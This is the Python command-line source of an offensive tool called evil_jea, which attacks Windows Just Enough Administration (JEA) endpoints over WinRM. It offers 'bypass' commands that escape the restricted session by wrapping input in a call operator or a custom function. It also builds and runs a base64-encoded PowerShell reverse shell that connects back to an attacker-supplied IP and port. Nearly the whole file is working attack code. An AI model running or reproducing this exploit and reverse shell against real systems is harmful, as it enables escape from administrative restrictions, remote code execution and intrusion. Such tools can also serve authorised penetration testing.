#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
This is the entry point for the command-line interface (CLI) application.

.. currentmodule:: evil_jea.cli
.. moduleauthor:: Sasha Thomas
"""
import logging
import click
import re
import base64
from pypsrp.powershell import PowerShell, RunspacePool
from pypsrp.wsman import WSMan
from pypsrp.messages import ErrorRecordMessage
from pypsrp.complex_objects import GenericComplexObject
from .__init__ import __version__

LOGGING_LEVELS = {
    0: logging.NOTSET,
    1: logging.ERROR,
    2: logging.WARN,
    3: logging.INFO,
    4: logging.DEBUG,
}  #: a mapping of `verbose` option counts to logging levels


class Info(object):
    """An information object to pass data between CLI functions."""

    def __init__(self):  # Note: This object must have an empty constructor.
        """Create a new instance."""
        self.verbose: int = 0


# pass_info is a decorator for functions that pass 'Info' objects.
#: pylint: disable=invalid-name
pass_info = click.make_pass_decorator(Info, ensure=True)


# Change the options to below to suit the actual options for your task (or
# tasks).
@click.group()
@click.option("--verbose", "-v", count=True, help="Enable verbose output.")
@pass_info
def cli(info: Info, verbose: int, max_content_width=120):
    '''\b
___________     .__.__                 ____.___________   _____   
\_   _____/__  _|__|  |               |    |\_   _____/  /  _  \  
 |    __)_\  \/ /  |  |    ______     |    | |    __)_  /  /_\  \ 
 |        \\\   /|  |  |__ /_____/ /\__|    | |        \/    |    \\
/_______  / \_/ |__|____/         \________|/_______  /\____|__  /
        \/                                          \/         \/ 
                                                                                                                         
    '''
    # Use the verbosity count to determine the logging level...
    if verbose > 0:
        logging.basicConfig(
            level=LOGGING_LEVELS[verbose]
            if verbose in LOGGING_LEVELS
            else logging.DEBUG
        )
        click.echo(
            click.style(
                f"Verbose logging is enabled. "
                f"(LEVEL={logging.getLogger().getEffectiveLevel()})",
                fg="yellow",
            )
        )
    info.verbose = verbose

help_text = """
JEA Shell Commands:
    help                    Show list of available commands
    info [command]          Dump definitions for available commands. 
    call [command]          JEA bypass: Attempts to run [command] using call operator 
    function [command]      JEA bypass: Attempts to run [command] inside of a custom function
    rev_shell [ip] [port]   JEA bypass: Attempts to run a PowerShell reverse shell using call operator
"""

@cli.command()
@click.argument('username')
@click.argument('password')
@click.argument('target')
@click.argument('configuration_name')
@click.option('--raw', '-r', is_flag=True, help="Pass commands through raw pipe (via add_script). Useful for executing non-cmdlet commands. Default is FALSE.")
def connect(username, password, target, configuration_name, raw):
    """
    Connect to JEA target.
    
    \b
    JEA Shell Commands:
        help                    Show list of available commands
        info [command]          Dump definitions for available commands. 
        call [command]          JEA bypass: Attempts to run [command] using call operator 
        function [command]      JEA bypass: Attempts to run [command] inside of a custom function
        rev_shell [ip] [port]   JEA bypass: Attempts to run a PowerShell reverse shell using call operator
    """
    commands = ["help", "call", "function", "info", "rev_shell"]
    wsman = WSMan(target, username=username,
              password=password, ssl=False,
              auth="negotiate",cert_validation=False)
    print("[+] Testing connection...")
    test_output = run_command(wsman, configuration_name, "Get-Command", raw)
    if (test_output):
        print("[+] Connection succeeded. Available commands:")
        for result in test_output:
            print(result)
    else:
        print("[-] Something went wrong. Check your credentials or the target.")

    while True:
        command = input(f"[{target}]: PS> ")
        splitted_command = command.split()
        if len(splitted_command) > 0:
            root_command = splitted_command[0]
            if root_command in commands:
                match root_command:
                    case "help":
                        print(help_text)
                    case "info":
                        info(wsman, configuration_name, raw)
                    case "call":
                        try:
                            new = " ".join(command.split()[1:])
                            for result in call_bypass(wsman, configuration_name, new, raw):
                                print(result)
                        except:
                            print("Something went wrong. Did you provide an argument to the call command?")
                    case "function":
                        try:
                            new = " ".join(command.split()[1])
                            for result in function_bypass(wsman, configuration_name, new, raw):
                                print(result)
                        except:
                            print("Something went wrong. Did you provide an argument to the call command?")
                    case "rev_shell":
                        try:
                            ip = command.split()[1]
                            port = command.split()[2]
                            reverse_shell(wsman, configuration_name, ip, port)
                        except:
                            print("Something went wrong. Did you pass an IP and port to connect back to?")
                    case _:
                        print("JEA shell command not found!")
            else:
                result = run_command(wsman, configuration_name, command, raw)
                if type(result) == ErrorRecordMessage:
                    print(result)
                else:
                    bad_keys = [
                        "Author",
                        "SessionType",
                        "SchemaVersion",
                        "GUID",
                        "ResourceUri",
                        "Capability",
                        "AutoRestart",
                        "ExactMatch",
                        "RunAsVirtualAccount",
                        "SDKVersion",
                        "Uri",
                        "MaxConcurrentCommandsPerShell",
                        "IdleTimeoutms",
                        "ParentResourceUri",
                        "OutputBufferingMode",
                        "Architecture",
                        "UseSharedProcess",
                        "MaxProcessesPerShell",
                        "Filename",
                        "MaxShellsPerUser",
                        "ConfigFilePath",
                        "MaxShells",
                        "SupportsOptions",
                        "lang",
                        "MaxIdleTimeoutms",
                        "xmlns",
                        "Enabled",
                        "ProcessIdleTimeoutSec",
                        "MaxConcurrentUsers",
                        "MaxMemoryPerShellMB",
                        "ModulesToImport",
                        "XmlRenderingType"
                    ]
                    for output in result:
                        if isinstance(output, GenericComplexObject):
                            obj_lines = output.property_sets
                            for key, value in output.adapted_properties.items():
                                if not key in bad_keys:
                                    obj_lines.append(u"%s: %s" % (key, value))
                            for key, value in output.extended_properties.items():
                                if not key in bad_keys:
                                    obj_lines.append(u"%s: %s" % (key, value))
                            output_msg = u"\n".join(obj_lines) + "\n"
                            print(output_msg)
                        else:
                            print(output)

@cli.command()
def version():
    """Get the library version."""
    click.echo(click.style(f"{__version__}", bold=True))

@cli.command()
@click.argument('username')
@click.argument('password')
@click.argument('target')
@click.argument('configuration_name')
@click.option('--command', '-c', required=True, help="Command to run on the taget")
@click.option('--raw', '-r', is_flag=True, help="Pass commands through raw pipe (via add_script). Useful for executing non-cmdlet commands. Default is FALSE.")
def run(username, password, target, command, configuration_name, raw):
    """
    Run a single command on the JEA target.    
    """

    wsman = WSMan(target, username=username,
              password=password, ssl=False,
              auth="negotiate",cert_validation=False)
    result = run_command(wsman, configuration_name, command, raw)
    for output in result:
        print(output)

@cli.command()
@click.argument('username')
@click.argument('password')
@click.argument('target')
@click.argument('lhost')
@click.argument('lport')
@click.argument('configuration_name')
def shell(username, password, target, lhost, lport, configuration_name):
    """
    Attempts to run a reverse shell on the target using a call operator bypass.    
    """

    wsman = WSMan(target, username=username,
              password=password, ssl=False,
              auth="negotiate",cert_validation=False)
    reverse_shell(wsman, configuration_name, lhost, lport)


def run_command(wsman, configuration_name, command, raw):
    commands = re.findall(r'(?:[^\s"]|"(?:\\.|[^"])*")+', command)
    with RunspacePool(wsman, configuration_name=configuration_name) as pool:
        ps = PowerShell(pool)
        if raw:
            ps.add_script(command)
        else:
            args = []
            params = []
            seen = False
            if len(commands) > 1:
                for cmd in commands[1:]:
                    if cmd.startswith("-"): 
                        params.append(cmd[1:])
                        seen = True
                        continue
                    else:
                        if seen:
                            params.append(cmd)
                            seen = False
                        else:
                            args.append(cmd)
                ps.add_cmdlet(commands[0])
                for arg in args:
                    ps.add_argument(args)
                for values in range(0, len(params), 2):
                    param, value = params[values:values + 2]
                    ps.add_parameter(param, value)
            else: 
                ps.add_cmdlet(command) 
        ps.invoke()
        if ps.had_errors:
            return ps.streams.error[0]
        return ps.output

def call_bypass(wsman, configuration_name, command, raw):
    result = run_command(wsman, configuration_name, "&{ " + command + " }", raw)
    return result

def function_bypass(wsman, configuration_name, command, raw):
    result = run_command(wsman, configuration_name, "function gl {" + command + "}; gl", raw)
    return result

def info(wsman, configuration_name, raw):
    result = run_command(wsman, configuration_name, 'Get-Command', raw)
    for output in result:
        print(f"Name: {output.adapted_properties.get('Name')}")
        print(f"Type: {output.adapted_properties.get('CommandType')}")
        print("==========================")
        print(output.adapted_properties.get('ScriptBlock'))
        
def reverse_shell(wsman, configuration_name, ip, port):
    shell = """
$client = New-Object System.Net.Sockets.TCPClient("{ip}",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
        """
    formatted = shell.replace("{ip}", ip).replace("{port}", port)
    bytes = formatted.encode('utf-16-le')
    b64 = base64.b64encode(bytes)
    payload = f"powershell -e {b64.decode()}"
    print("Running reverse shell payload using call bypass, check your listener:")
    print(payload)
    call_bypass(wsman, configuration_name, payload, True)

